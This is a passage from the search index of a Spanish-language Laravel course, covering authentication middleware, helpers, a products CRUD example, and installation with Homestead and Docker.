de login completo y superseguro. Solo te queda adaptar esas vistas y controladores a tus necesidades. 5.13.5. Autenticación y vistas: cómo generar código dependiendo del tipo de usuario . En las vistas, tenemos un par de directivas de Blade muy útiles relacionadas con las sesiones: @auth y @guest. Puedes ver cómo funcionan en este ejemplo: . @auth ... // Este código solo se ejecuta si existe un usuario logueado @endauth @guest ... // Este código solo se ejecuta si NO existe usuario logueado @endguest . Además, podemos acceder a los datos del usuario mediante la clase Auth: . $user = Auth::user() // Devuelve el usuario actualmente logueado o null si no hay ninguna sesión abierta. if (Auth::check()) { // Devuelve true si el usuario actual está logueado... } . (Más métodos de Auth en la documentación oficial) . 5.13.6. Autenticación y middlewares: cómo proteger los controladores . Los middlewares de Laravel son componentes que capturan y filtran todas las peticiones HTTP que llegan a la aplicación. Literalmente, se ponen en medio de cualquier petición al servidor, y de ahí su nombre. Están ubicados en App/Http/Middleware. Hay dos middlewares importantes relacionados con la autenticación en Laravel: Authenticate (que tiene un alias: auth) y RedirectIfAuthenticated (alias guest). Los alias se definen en App/Http/Kernel.php . Podemos usar estos middlewares en el constructor de nuestros controladores para protegerlos en todo o en parte. Es decir, para impedir el acceso de usuarios no logueados a ciertos métodos del controlador. Observa este ejemplo para aprender a hacerlo. Ya verás qué fácil y versátil es: . public function __construct() { // Solo usuarios logueados podrán acceder a cualquier función de este controlador: $this-&gt;middleware(\"auth\"); // Solo usuarios logueados podrán acceder a los métodos create() y edit(): $this-&gt;middleware(\"auth\")-&gt;only(\"create\", \"edit\"); // Solo usuarios logueados podrán acceder al controlador excepto a show(): $this-&gt;middleware(\"auth\")-&gt;except(\"show\"); } . El middleware auth también puede usarse en el enrutador, para proteger el acceso a una ruta concreta, así: . Route::get('/ruta-a-proteger', 'Controlador@metodo')-&gt;middleware('auth'); . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/sesiones.html#513-sesiones-con-laravel",
    "relUrl": "/laravel/sesiones.html#513-sesiones-con-laravel"
  },"70": {
    "doc": "5.13 Sesiones con Laravel",
    "title": "5.13 Sesiones con Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/sesiones.html",
    "relUrl": "/laravel/sesiones.html"
  },"71": {
    "doc": "5.14 Helpers de Laravel",
    "title": "5.14. Helpers de Laravel",
    "content": ". | 5.14.1. ¿Qué son los helpers? | 5.14.2. Algunos helpers útiles de Laravel | . Los helpers son componentes de Laravel que hemos estado usando casi desde el principio sin darnos cuenta porque, como su propio nombre indica, nos ayudan a resolver pequeñas tareas tediosas. Ha llegado el momento de presentártelos formalmente, ¿no crees? . 5.14.1. ¿Qué son los helpers? . Un helper es un componente del framework diseñado para facilitar alguna tarea típica en el desarrollo de una aplicación web. Por ejemplo: el helper url() sirve para generar un ruta absoluta a partir de una relativa, de modo que la ruta absoluta siempre funcione, sea cual sea el servidor donde ejecutes la aplicación. Aquí puedes ver un ejemplo de uso de este helper: . &lt;a href='{{ url('/users/login') }}&gt;Volver&lt;/a&gt; . Cuando el helper url() actúe, traducirá la expresión anterior por este código HTML: . &lt;a href='https://miservidor.com/users/login'&gt;Volver&lt;/a&gt; . Eso permite que la ruta sea correcta aunque muevas la aplicación de un servidor a otro, sin necesidad de modificar el código fuente. El uso de los helpers es optativo: solo son ayudantes, y el programador/a debe decidir si le resultan útiles o no. Los helpers cambian mucho de una versión a otra de Laravel, por lo que te recomiendo que eches un vistazo a la documentación oficial para saber qué helpers están disponibles en tu versión de Laravel. Puedes encontrar una lista completa de helpers en: https://laravel.com/docs/X.x/helpers (sustituye X.x por tu versión de Laravel) . 5.14.2. Algunos helpers útiles de Laravel . 5.14.2.1. url helper . Ya lo hemos visto en el ejemplo anterior. Crea rutas absolutas a enlaces de tu alicación a partir de rutas relativas. Las rutas absolutas siempre son más fiables, pero tienen el problema de que hay que cambiarlas si la aplicación cambia de servidor. Ese problema lo resuelve el helper url(). Se usa como en este ejemplo: . &lt;a href='{{ url('/users/login') }}&gt;Volver&lt;/a&gt; . El código anterior generará este HTML: . &lt;a href='https://miservidor.com/users/login'&gt;Volver&lt;/a&gt; . 5.14.2.2. route helper . Es parecido a url(), pero sirve para rutas con nombre. Por ejemplo, si en el enrutador tenemos una ruta con nombre como esta: . Route::get(\"mi-ruta\", \"metodo@mi-controlador\")-&gt;name(\"nombre-ruta\"); . …podemos referirnos a ella en cualquier vista como: . &lt;a href='{{ url('mi-ruta') }}&gt;Texto&lt;/a&gt; . …o como: . &lt;a href='{{ route('nombre-ruta') }}&gt;Texto&lt;/a&gt; . La segunda forma es mejor que la primera, porque nos permite cambiar en cualquier momento la dirección que ve el usuario sin modificar el código fuente del resto de la aplicación. 5.14.2.3. request helper . Este helper proporciona información sobre la petición (GET, POST o la que sea) con la que se cargó la página. El helper request() devuelve un objeto con varios métodos para acceder a esa información. Estos son los más útiles: . | request()-&gt;url() → Devuelve un string con la ruta actual (completa). | request()-&gt;path() → Devuelve un string con la ruta actual (solo desde la raíz de la aplicación, sin http ni el nombre del servidor). | request()-&gt;is(“ruta”) → Devuelve true si “ruta” coincide con la ruta actual. Admite wildcards (símbolos * y ?). | request()-&gt;input(“campo”) → Devuelve el valor de “campo” (enviado desde formulario). | request()-&gt;all() → Devuelve un array con todos los campos. | request()-&gt;has(“campo”) → Devuelve true si en la petición existe un campo con el nombre indicado. | request()-&gt;isMethod(“método”) → Devuelve true si la petición se hizo por el método indicado (POST, GET, PUT, etc). | . El helper request() puede usarse en las vistas (como request()-&gt;url(), por ejemplo) o inyectarse en las funciones del controlador como un argumento, así: . public function mi_función(Request $r) . En este último caso, podemos acceder a todos los datos enviados mediante un formulario a través del objeto $r. Por ejemplo: . public function mi_función(Request $r) { $name = $r-&gt;name; $email = $r-&gt;email; $pass = $r-&gt;password; ...etc... } . 5.14.2.4. redirect helper . Muy útil cuando queremos redirigir al usuario hacia otra URL o acción (por ejemplo, para evitar que al pulsar F5 se reenvíen los datos de un formulario). Admite varias formas: . return redirect('user/login'); return redirect()-&gt;action('LoginController@login'); return back(); . 5.14.2.5. auth helper . Como vimos en la sección de sesiones y autenticación, este helper permite saber si existe algún usuario autenticado en la aplicación. auth()-&gt;user() nos devolverá el usuario autenticado (como un objeto de tipo User) o null si nadie ha hecho login. Con el objeto User podemos acceder a todos los datos del usuario. Por ejemplo: . $user = auth()-&gt;user(); Bienvenido/a, {{ $user-&gt;name }}. Este es su email: {{ $user-&gt;email }} . 5.14.2.6. errors helper . Se utiliza para conocer y mostrar los errores de validación de un formulario. El objeto $errors está disponible en todas las vistas gracias a que un Middleware (ShareErrorsFromSession) la inyecta automáticamente. Algunos métodos útiles de este objeto son: . | $errors-&gt;all() → devuelve un array con todos los errores detectados. | $errors-&gt;any() → devuelve true si se ha detectado algún error. | $errors-&gt;first(“campo”) → devuelve el primer error de todos los que puedan afectar al campo indicado. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/helpers.html#514-helpers-de-laravel",
    "relUrl": "/laravel/helpers.html#514-helpers-de-laravel"
  },"72": {
    "doc": "5.14 Helpers de Laravel",
    "title": "5.14 Helpers de Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/helpers.html",
    "relUrl": "/laravel/helpers.html"
  },"73": {
    "doc": "5.15 Flujo de trabajo típico con Laravel",
    "title": "5.15. Flujo de trabajo típico con Laravel",
    "content": "Lo que vas a encontrar aquí es solo un posible flujo de trabajo con Laravel, es decir, una propuesta del orden en el que debes hacer las cosas para desarrollar una aplicación con este framework. No es el único flujo de trabajo posible, y sin duda no es el mejor, pero puede resultarte útil en tus primeros desarrollos, como si alguien te llevara de la mano a lo largo de un camino sinuoso. Más adelante, cuando vayas adquiriendo experiencia, tú mismo/a crearás tu propio flujo de trabajo ideal. El flujo que te propongo tiene los siguientes pasos (los cuatro primeros son solo para aplicaciones nuevas): . | Instalar y configurar la nueva aplicación. | Crear los modelos (se supone que ya tendrás la BD diseñada). | Crear las migraciones y los seeders. | Lanzar las migraciones y seeders para crear y poblar la BD. | Crear en el enrutador las entradas de la funcionalidad que vas a programar. | Crear el controlador (si no existe) para la funcionalidad que vas a programar. | Crear las funciones del controlador necesarias. | Crear las funciones del modelo necesarias (si no existen ya). | Crear las vistas necesarias. | Probar. | Repetir los pasos 5-10 para cada funcionalidad adicional. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/flujo-de-trabajo-con-laravel.html#515-flujo-de-trabajo-t%C3%ADpico-con-laravel",
    "relUrl": "/laravel/flujo-de-trabajo-con-laravel.html#515-flujo-de-trabajo-típico-con-laravel"
  },"74": {
    "doc": "5.15 Flujo de trabajo típico con Laravel",
    "title": "5.15 Flujo de trabajo típico con Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/flujo-de-trabajo-con-laravel.html",
    "relUrl": "/laravel/flujo-de-trabajo-con-laravel.html"
  },"75": {
    "doc": "5.16 Aspectos avanzados de Laravel",
    "title": "5.16. Aspectos avanzados de Laravel",
    "content": "En este apartado iremos añadiendo información breve sobre algunos aspectos avanzados de Laravel que no nos haya dado tiempo a tratar en las sesiones teóricas pero que surjan durante el desarrollo de los proyectos y sean interesantes. Algunos de esos aspectos pueden ser: . | Cómo desplegar Laravel en (casi) caulquier servidor sin volverse loco | Cómo actualizar la versión de Laravel de una aplicación existente sin pegarse un tiro en el pie | Traducciones | Testing con Laravel | Testing con herramientas externas: PHPUnit, Mockery, Selenium | Paginación de vistas | Routes model bindings | Validación avanzada de formularios con form requests | Laravel Mix para precompilación de CSS y Javascript | Cómo crear nuestros propios helpers y middlewares | Manipulación avanzada de las colecciones de Laravel (collections) | Eventos y listeners | Mejoras del rendimiento. Caché de Laravel | Decoradores e interfaces | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/aspectos-avanzados.html#516-aspectos-avanzados-de-laravel",
    "relUrl": "/laravel/aspectos-avanzados.html#516-aspectos-avanzados-de-laravel"
  },"76": {
    "doc": "5.16 Aspectos avanzados de Laravel",
    "title": "5.16 Aspectos avanzados de Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/aspectos-avanzados.html",
    "relUrl": "/laravel/aspectos-avanzados.html"
  },"77": {
    "doc": "5.17 CRUD desarrollado con Laravel",
    "title": "5.17. CRUD desarrollado con Laravel: un ejemplo completo",
    "content": ". | Migraciones | Seeders | Enrutador | Controlador | Modelo | Vista: plantilla principal | Vista: todos los productos | Vista: creación/modificación de productos | ¿Y ahora qué? | . Para finalizar esta introducción (sí, sí: aunque haya sido muy largo, no es más que una introducción) a Laravel, vamos a desarrollar una pequeña aplicación web desde cero. Se tratará, en realidad, de un fragmento de otra aplicación más grande: una tienda online o tal vez un sistema de gestión de almacén. Da lo mismo. Nosotros vamos a desarrollar la parte de mantenimiento de productos. Para ello, supondremos que en la base de datos existe una tabla llamada products con los campos id, name, description y price. Vamos a construir el controlador, el modelo y las vistas necesarias para hacer el CRUD completo (create-read-update-delete) de esta tabla con Laravel, sin olvidarnos de las migraciones, los seeders y, por supuesto, el enrutador. ¿Estás preparado/a? Pues vamos allá. Migraciones . Para esta miniaplicación solo necesitamos una migración, puesto que solo tenemos que crear una tabla. La migración se crea con el comando php artisan make:migration create_table_products y se escribe en el archivo /database/migrations/_timestamp_create_products_table.php, que tendrá este contenido: . &lt;?php use Illuminate\\Database\\Migrations\\Migration; use Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema; class CreateProductsTable extends Migration { /** * Run the migrations. * * @return void */ public function up() { Schema::create('products', function (Blueprint $table) { $table-&gt;id(); $table-&gt;string('name', 100); $table-&gt;string('description', 500); $table-&gt;double('price', 5, 2); $table-&gt;timestamps(); }); } /** * Reverse the migrations. * * @return void */ public function down() { Schema::dropIfExists('products'); } } . Seeders . En este seeder vamos a cargar unos cuantos datos de prueba. Obviamente, puedes cambiarlos por los que tú quieras. El seeder se crea con el comando php artisan make:seeder ProductTableSeeder, eque generará el archivo /database/seeders/ProductTableSeeder.php. Recuerda que, para poder lanzar el seeder automáticamente con php artisan migrate:fresh --seed u otro comando similar, tienes que editar el archivo DatabaseSeeder.php y añadir el seeder de productos. Si no recuerdas cómo hacerlo, consulta la sección de este tema dedicada a las migraciones. En cualquier caso, siempre puedes lanzar el seeder manualmente en cualquier momento con php artisan db:seed --class=ProductTableSeeder. &lt;?php namespace Database\\Seeders; use Illuminate\\Database\\Seeder; use DB; class ProductTableSeeder extends Seeder { /** * Run the database seeds. * * @return void */ public function run() { DB::table('products')-&gt;insert([ 'name' =&gt; 'Papel higiénico', 'description' =&gt; 'Papel higiénico extrasuave para glúteos sensibles', 'price' =&gt; '1.35', ]); DB::table('products')-&gt;insert([ 'name' =&gt; 'Lejía blanca 1L', 'description' =&gt; 'Lejía pura capaz de traladrar las baldosas', 'price' =&gt; '0.95', ]); DB::table('products')-&gt;insert([ 'name' =&gt; 'Detergente Ariel 1.5L', 'description' =&gt; 'Detergente líquido para lavadoras', 'price' =&gt; '4.90', ]); DB::table('products')-&gt;insert([ 'name' =&gt; 'Gel Hidroalcohólico 350ml', 'description' =&gt; 'Gel hidroalcólico sin perfume, 70% de alcohol', 'price' =&gt; '3.50', ]); DB::table('products')-&gt;insert([ 'name' =&gt; 'Gel de baño con avena - 750 ml', 'description' =&gt; 'Gel de baño con aceites vegetales, hipoalergénico', 'price' =&gt; '1.50', ]); } } . Enrutador . El enrutador de la aplicación está en /routes/web.php. Basta con abrirlo y añadir esta línea: . Route::resource('products', 'ProductController'); . Alternativamente, podrías crear a mano las siete entradas correspondientes a las siete rutas de un servidor REST, así: . Route::get('product', 'ProductController@index')-&gt;name('product.index'); Route::get('product/{product}', 'ProductController@show')-&gt;name('product.show'); Route::get('product/create', 'ProductController@create')-&gt;name('product.create'); Route::post('product/{product}', 'ProductController@store')-&gt;name('product.store'); Route::get('product/{product}/edit', 'ProductController@edit')-&gt;name('product.edit'); Route::patch('product/{product}', 'ProductController@update')-&gt;name('product.update'); Route::delete('product/{product}', 'ProductController@destroy')-&gt;name('product.destroy'); . El resultado sería el mismo, pero si defines manualmente las rutas, tienes más control sobre cómo son exactamente. Por ejemplo, puedes traducirlas a español (¿qué tal cambiar “product/create” por “producto/crear”?). O podrías hacer algún cambio más profundo a nivel técnico. Por ejemplo, que la petición para hacer delete llegue por GET en lugar de por DELETE (así no tendrías que usar un botón de formulario para lanzar el borrado de un producto y podrías lanzarlo con un link). Eso sí: ten en cuenta que, si haces algún cambio de este tipo en las rutas, tu servidor ya no será 100% REST. Hay una posibilidad intermedia: respetar las 7 rutas estándar REST y añadir alguna adicional que te venga bien, como el borrado mediante GET. Algo así: . // Estas son las 7 rutas estándar REST: Route::resource('products', 'ProductController'); // Añadimos una ruta NO ESTÁNDAR para borrar productos mediante GET Route::get('product/delete/{product}', 'ProductController@destroy')-&gt;name('product.myDestroy'); . Controlador . El controlador de productos se crea con el comando php artisan make:controller ProductController. El archivo se generará en /app/Http/Controllers/ProductController.php. Tendrás que rellenar el código de los 7 métodos REST con algo como esto:: . &lt;?php namespace App\\Http\\Controllers; use Illuminate\\Http\\Request; use App\\Models\\Product; class ProductController extends Controller { public function index() { $productList = Product::all(); return view('product.all', ['productList'=&gt;$productList]); } public function show($id) { $p = Product::find($id); $data['product'] = $p; return view('product.show', $data); } public function create() { return view('product.form'); } public function store(Request $r) { $p = new Product(); $p-&gt;name = $r-&gt;name; $p-&gt;description = $r-&gt;description; $p-&gt;price = $r-&gt;price; $p-&gt;save(); return redirect()-&gt;route('product.index'); } public function edit($id) { $product = Product::find($id); return view('product.form', array('product' =&gt; $product)); } public function update($id, Request $r) { $p = Product::find($id); $p-&gt;name = $r-&gt;name; $p-&gt;description = $r-&gt;description; $p-&gt;price = $r-&gt;price; $p-&gt;save(); return redirect()-&gt;route('product.index'); } public function destroy($id) { $p = Product::find($id); $p-&gt;delete(); return redirect()-&gt;route('product.index'); } } . Modelo . El modelo se crea con el comando php artisan make:model Product. El archivo con el modelo se generará en app/models/product.php. No es necesario que toques este archivo: puedes dejarlo, de momento, tal y como lo ha generado Artisan. Vista: plantilla principal . La plantilla principal o master layout debes crearla en views/layouts/master.blade.php. Por supuesto, puedes hacerla como quieras. Aquí te propongo un master layout muy sencillito al que luego le podrás ir añadiendo cosas fácilmente: . &lt;html&gt; &lt;head&gt; &lt;title&gt;@yield('title')&lt;/title&gt; &lt;/head&gt; &lt;body&gt; @section('sidebar') Este es mi master sidebar. @show &lt;div class=\"container\"&gt; @yield('content') &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; . Vista: todos los productos . La vista con todos los productos la llamaremos views/products/all.blade.php y puede tener un aspecto como este: . @extends(\"layouts.master\") @section(\"title\", \"Administración de productos\") @section(\"header\", \"Administración de productos\") @section(\"content\") &lt;a href=\"\"{{ route('product.create') }}\"\"&gt;Nuevo&lt;/a&gt; &lt;table border='1'&gt; @foreach ($productList as $product) &lt;tr&gt; &lt;td&gt;\"{{$product-&gt;name}}\"&lt;/td&gt; &lt;td&gt;\"{{$product-&gt;description}}\"&lt;/td&gt; &lt;td&gt;\"{{$product-&gt;price}}\"&lt;/td&gt; &lt;td&gt; &lt;a href=\"\"{{route('product.edit', $product-&gt;id)}\"}\"&gt;Modificar&lt;/a&gt;&lt;/td&gt; &lt;td&gt; &lt;form action = \"\"{{route('product.destroy', $product-&gt;id)}\"}\" method=\"POST\"&gt; @csrf @method(\"DELETE\") &lt;input type=\"submit\" value=\"Borrar\"&gt; &lt;/form&gt; &lt;/td&gt; &lt;br&gt; @endforeach @endsection . Vista: creación/modificación de productos . Reutilizaremos la vista para crear y modificar productos, puesto que son prácticamente iguales. El archivo de la vista será views/products/form.blade.php, y su contenido puede ser algo así: . @extends(\"layouts.master\") @section(\"title\", \"Inserción de productos\") @section(\"header\", \"Inserción de productos\") @section(\"content\") @isset($product) &lt;form action=\"\"{{ route('product.update', ['product' =&gt; $product-&gt;id]) }}\"\" method=\"POST\"&gt; @method(\"PUT\") @else &lt;form action=\"\"{{ route('product.store') }}\"\" method=\"POST\"&gt; @endisset @csrf Nombre del producto:&lt;input type=\"text\" name=\"name\" value=\"\"{{$product-&gt;name ?? '' }}\"\"&gt;&lt;br&gt; Descripción:&lt;input type=\"text\" name=\"description\" value=\"\"{{$product-&gt;description ?? '' }}\"\"&gt;&lt;br&gt; Precio:&lt;input type=\"text\" name=\"price\" value=\"\"{{$product-&gt;price ?? '' }}\"\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; @endsection . Observa cómo se genera una cabecera de formulario distinta según se vaya a usar el formulario para crear o para modificar un producto. Asímismo, fíjate en cómo se rellenan los atributos value de los campos del formulario con los datos actuales del producto (en caso de que existan). ¿Y ahora qué? . Ahora ha llegado el momento de comprobar si tu aplicación funciona. Primero, lanza las migraciones y los seeders con php artisan migrate:fresh --seed. Asegúrate de haber añadido tu seeder de productos a DatabaseSeeder.php para que se lance automáticamente tras las migraciones. Si todo va bien, la aplicación estará lista para responder en https://tu-servidor-local/product . El código que hemos mostrado hasta aquí solo es un pequeño ejemplo y se puede mejorar de muchísimas maneras, por supuesto. Estas son algunas mejoras evidentes: . | Programar la vista product/show.blade.php, que está ausente en el código anterior. Esa es la vista que mostrará un producto individual. Si intentas lanzarla ahora pidiendo la ruta https://tu-servidor/product/1 (sustituye 1 por el ID de cualquier producto), verás que Laravel te da un error de “View not found”. | Se puede simplificar el método store() del controlador haciendo una asignación masiva. Bastaría con indicar en el modelo que todos los campos de la tabla son fillables para poder hacer en el método store() del controlador algo como esto: $p = new Product($r-&gt;all()) | Se puede alterar el aspecto visual de la aplicación trabajando el master layout y añadiendo ahí algo de CSS y/o Javascript, sin que haya que tocar el resto de vistas. | A partir de ahí, habría que seguir construyendo la aplicación, añadiendo más tablas con su correspondientes controladores, modelos y vistas. Llegará un momento en el que tendremos que crear las relaciones entre las tablas en los modelos, como explicamos en el apartado dedicado a Eloquent. | Otro paso lógico, común a muchas aplicaciones web, sería añadir un sistema de autenticación con Laravel Breeze. | . Utiliza este código fuente como punto de partida para tus propios desarrollos con Laravel. Cuando hayas cogido un poco de práctica, verás que resulta mucho más rápido montar una aplicación web convencional con Laravel que hacerlo con PHP clásico. ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/crud-con-laravel.html#517-crud-desarrollado-con-laravel-un-ejemplo-completo",
    "relUrl": "/laravel/crud-con-laravel.html#517-crud-desarrollado-con-laravel-un-ejemplo-completo"
  },"78": {
    "doc": "5.17 CRUD desarrollado con Laravel",
    "title": "5.17 CRUD desarrollado con Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/crud-con-laravel.html",
    "relUrl": "/laravel/crud-con-laravel.html"
  },"79": {
    "doc": "5.2 Características de Laravel",
    "title": "5.2. Características de Laravel",
    "content": ". | 5.2.1. Ventajas de Laravel | 5.2.2. Inconvenientes de Laravel | . Laravel es un framework PHP MVC para desarrollo rápido de aplicaciones web. Automatiza muchos procesos habituales y tiene una curva de aprendizaje empinada, pero no tanto como otros frameworks (con “otros” queremos decir “Symfony”, que es, sin duda, el framework más difícil de aprender). Desde hace algunos años, Laravel ha experimentado un crecimiento espectacular en el mercado de las aplicaciones web. 5.2.1. Ventajas de Laravel . Para ir abriendo boca, te cuento algunos de los puntos fuertes que tiene Laravel: . | Sintaxis simple y elegante. | Mapeo objeto-relacional (ORM): Eloquent. | Potente sistema de plantillas para vistas: Blade. | Reutiliza y moderniza componentes de Symfony. | Es sencillo (esto es un decir) y potente. | Uso creciente en la industria: es previsible que domine el mercado durante los próximos años. | Comunidad de usuarios altamente especializada (buena relación señal/ruido, al menos de momento) | . 5.2.2. Inconvenientes de Laravel . Como no hay nada perfecto, es evidente que Laravel también tiene algunos defectillos. Entre ellos, estos: . | Instalación, configuración y despliegue complejos, incluso a través de servicios de virtualización. | Curva de aprendizaje elevada. | Se mueve según los intereses personales de su autor (es obra individual), con actualizaciones muy frecuentes y cambios caprichosos. Las actualizaciones pueden ser un quebradero de cabeza. | Inestabilidad de varios de sus componentes: a menudo hay que recurrir a fixes o a componentes de terceros. | Fuerte dependencia de la consola de comandos y de herramientas de terceros (composer, vagrant, npm…). Esto, por supuesto, solo es un inconveniente para las personas que tengan alergia a la consola de comandos. | . ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/caracteristicas.html#52-caracter%C3%ADsticas-de-laravel",
    "relUrl": "/laravel/caracteristicas.html#52-características-de-laravel"
  },"80": {
    "doc": "5.2 Características de Laravel",
    "title": "5.2 Características de Laravel",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/laravel/caracteristicas.html",
    "relUrl": "/laravel/caracteristicas.html"
  },"81": {
    "doc": "5.3 Instalación de Laravel",
    "title": "5.3. Instalación de Laravel",
    "content": ". | 5.3.1. Instalación nativa en servidor local | 5.3.2. Instalación de Laravel con máquina virtual Vagrant (Homestead) | 5.3.3. Laravel con Docker | . En esta sección vamos a describir el proceso de instalación de Laravel en un servidor local para desarrollo. Hay, básicamente, tres posibilidades: . | Usar un servidor Apache (o similar) local y configurarlo adecuadamente para que Laravel funcione. | Usar un servidor virtualizado mediante Vagrant. | Usar un servidor virtualizado mediante Docker. | . Vagrant y Docker son dos soluciones de virtualización muy utilizadas últimamente. La virtualización es un campo fascinante y en la cresta de la ola. Lamentablemente, aquí no tenemos ni tiempo ni espacio para hablarte largo y tendido sobre ello, por lo que nos limitaremos a explicarte los pasos que debes seguir para montar tu servidor virtualizado y ponerte a trabajar con Laravel, sin entrar en otros detalles. Si quieres aprender más sobre Vagrant: https://www.vagrantup.com/docs . Si quieres aprender más sobre Docker: https://docs.docker.com/ . 5.3.1. Instalación nativa en servidor local . No es recomendable instalar Laravel de forma nativa en tu servidor local porque requiere una fuerte configuración del servidor. Tendrás que instalar bastante librerías que consumirán recursos de tu máquina sin necesidad, tales como OpenSSL, Mbstring o Tokenizer. También necesitarás instalar composer, la herramienta de resolución de dependencias de PHP. Por todo ello, los desarrolladores de Laravel aconsejan virtualizar el servidor. Esto lo podemos hacer mediante Vagrant o Docker. Discutiremos estas dos opciones más adelante. Si, aún así, estás decidido a instalar Laravel de forma nativa en tu servidor local, sigue estos pasos: . Paso 1 . Instala todo el software de servidor necesario para que Laravel funcione. Empieza por instalar composer, la herramienta de instalación de dependencias de PHP. Después, durante la instalación de Laravel, el propio composer se encargará de instalar el resto del software necesario. Si no puede instalar algo, ya te avisará para que lo hagas tú manualmente. Paso 2 . Descarga Laravel usando composer. $ composer global require \"laravel/installer\" . Paso 3 . Instala una copia de Laravel limpia y lista para usar (en un directorio accesible por Apache o el servidor web que estés usando, claro). Puede ser que tengas que añadir el comando laravel al PATH del sistema. $ laravel new &lt;nombre-aplicación&gt; . Por ejemplo: . $ laravel new blog . No olvides dar los permisos necesarios a tus archivos y directorios. Problemas frecuentes . Lamentablemente, la lista de posibles problemas que pueden surgir durante una instalación nativa de Laravel son tantos y tan variados, dependiendo de la configuración de tu servidor, que sería imposible dar una lista exhaustiva. Te vuelvo a recordar que los desarrolladores de Laravel desaconsejan instalarlo de este modo, pero allá tú. Si sigues empeñado/a en hacerlo, puedes intentar seguir alguna de estas guías: . | Guía para instalar Laravel en localhost en Ubuntu Linux . | Guía para instalar Laravel en localhost con Windows y XAMPP: . | . 5.3.2. Instalación de Laravel con máquina virtual Vagrant (Homestead) . Vagrant es una herramienta para crear un entorno de desarrollo virtual portable sin necesidad de instalar componentes en nuestra máquina. Utiliza de forma transparente alguna otra tecnología de virtualización, como VirtualBox, VMWare, Docker o KVM. Con Vagrant se pueden crear entornos de desarrollo perfectamente configurados que luego podemos replicar con un simple comando cad vez que los necesitemos. Esto agiliza mucho el proceso de configuración de nuestro servidor web. Cada entorno de desarrollo configurado con Vagrant se llama Box. Hay cientos de boxes ya configurados que podemos usar, o podemos definir los nuestros propios. Pues bien, Homestead es un Box de Vagrant con todo lo necesario para desarrollar con Laravel sin necesidad de configurar nada en nuestro servidor local. Este Box, creado por los propios desarrolladores de Laravel, puede adaptarse para equipararlo al servidor donde se vaya a desplegar la aplicación en el futuro. La instalación de Laravel por medio de Homestead es la forma recomendada para desarrollar proyectos Laravel en un entorno local. La puesta en producción es otra historia, y dependerá de las posibilidades de configuración del servidor. Instalar Laravel con Homestead en tu entorno local puede parecer un proceso largo y complejo, pero no suele dar problemas y la fiabilidad de está solución está garantizada, por lo que es la manera más recomendable. Si deseas instalarlo, sigue estos pasos: . Paso 1 . Instala en tu ordenador la última versión disponible de Virtual Box. Paso 2 . Instala también Vagrant y git (si aún no lo tenías instalado) . Paso 3 . Agrega a Vagrant el box de Homestead con este comando: . $ vagrant box add laravel/homestead . Paso 4 . Consigue el último código fuente de Laravel: . $ git clone https://github.com/laravel/homestead.git ~/Homestead . Paso 5 . Selecciona la rama “release” del repositorio de Laravel y lanza el script de inicialización: . $ cd Homestead $ git checkout release $ bash init.sh (o init.bat en Windows) . Paso 6 . Edita el archivo Homestead.yaml para configurar tu máquina virtual. Es un archivo bastante sencillo de entender. Normalmente, basta con ajustar los nombres de las carpetas. Paso 7 . Edita el archivo hosts de tu sistema (/etc/hosts en Linux o C:\\Windows\\System32\\drivers\\etc\\hosts en Windows) para añadir esta línea: . 192.168.10.10 homestead.test . (En el archivo .yaml puedes configurar otra IP para tu máquina virtual si lo prefieres) . Paso 8 . Levanta la máquina virtual Homestead: . $ vagrant up . (Este comando hay que ejecutarlo desde el directorio Homestead) . La primera vez puede tardar un rato mientras crea y configura la VM. Paso 9 . Prueba en el navegador la dirección: http://homestead.test. El servidor debería responder. Paso 10 . Prueba a acceder a la VM mediante ssh con el comando: . $ vagrant ssh . Paso 11 . En la máquina real, crea el directorio ~/code (o el que esté configurado en el archivo Homestead.yaml). Paso 12 . En la máquina virtual, a la que te habrás conectado con $ vagrant ssh, ve al mismo directorio ~/code (o el que esté configurado en Homestead.yaml) y actualiza las librerías PHP con composer: . $ composer create-project laravel/laravel code --prefer-dist $ composer install . ¡Y listo! A partir de ahora, tú trabajarás en tu directorio local ~/code y cualquier cambio que hagas se mapeará automáticamente al directorio ~/code en la VM. Mantén todo el tiempo una consola abierta en la VM para ejecutar los comandos que vayas necesitando, que con Laravel serán muchos. Ten en cuenta que MySQL estará escuchando en 127.0.0.1:33060 (con el user “Homestead” y la password “secret”, salvo que hayas cambiado la configuración), pero ojo: esto solo es para conexiones desde fuera de Homestead. Desde el punto de vista de la app, MySQL seguirá estando en localhost:3306. Dependiendo de tu versión de Laravel, es posible que necesites generar una clave SSH para conexiones seguras con tu servidor virtual. Aquí tienes un par de enlaces sobre como hacerlo: . | Cómo hacerlo en Linux . | Cómo hacerlo en Windows 10 . | . Más información sobre el proceso de instalacion de Homestead en https://laravel.com/docs/8.X/homestead . 5.3.3. Laravel con Docker . Docker es una solución de virtualización aún más ligera que Vagrant. Con Docker, se virtualizan solo los servicios de software que nuestra aplicación necesita para funcionar (en lugar de la máquina completa, como haría Virtual Box, por ejemplo), y se ejecutan directamente en la máquina anfitrión. Los servicios virtualizados se agrupan en conjuntos llamados images. Cuando una image se instancia (como quien instancia una clase en programación orientada a objetos), pasan de denominarse containers. Hay docker images para todo lo imaginable. Puedes encontrarlas en https://hub.docker.com. Aunque Laravel recomienda la virtualización mediante Vagrant, muchos desarrolladores optan por Docker. Así que, si prefieres instalar Laravel mediante Docker para un desarrollo local, sigue estos pasos: . Paso 1 . Instala docker y, optativamente, otra herramienta llamada docker-compose, en tu ordenador. Descárgalos de la web del desarrollador (https://docs.docker.com/get-docker/) o de los repositorios oficiales de tu distribución, si estás usando GNU/Linux. docker-compose es una utilidad de Docker para instanciar simultáneamente varios contenedores configurados, por lo que no es mala idea tenerla instalada junto con Docker. Paso 2 